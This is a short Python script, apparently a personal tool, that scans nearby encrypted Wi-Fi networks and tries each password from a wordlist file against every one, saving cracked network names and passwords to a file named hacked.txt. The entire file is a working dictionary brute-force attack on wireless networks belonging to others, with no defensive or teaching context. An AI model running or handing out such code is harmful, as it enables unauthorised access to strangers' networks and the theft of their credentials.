import wireless
from wifi import Cell

h = open('hacked.txt', 'a+')
pwd_file = open('passwords.txt')
passwords = pwd_file.read().split('\n')


def Search():
    wifilist = []
    cells = Cell.all('wlp62s0')
    for cell in cells:
        if cell.encrypted and cell.ssid != 'DIRECT-FE-HP DeskJet 2600 series':
            wifilist.append(cell)
    if len(wifilist) > 0:
        return wifilist
    else:
        print("couldn't find any networks")
        exit()


ssids = Search()
wireless = wireless.Wireless()
print("first network found: ", ssids[0].ssid)

for ssid in ssids:
    network_name = ssid.ssid
    print(network_name)
    for pw in passwords:
        if wireless.connect(ssid=network_name, password=pw):
            line = "ssid: " + network_name + ", pwd: " + pw + "\n"
            h.write(line)
            print(line)
            break
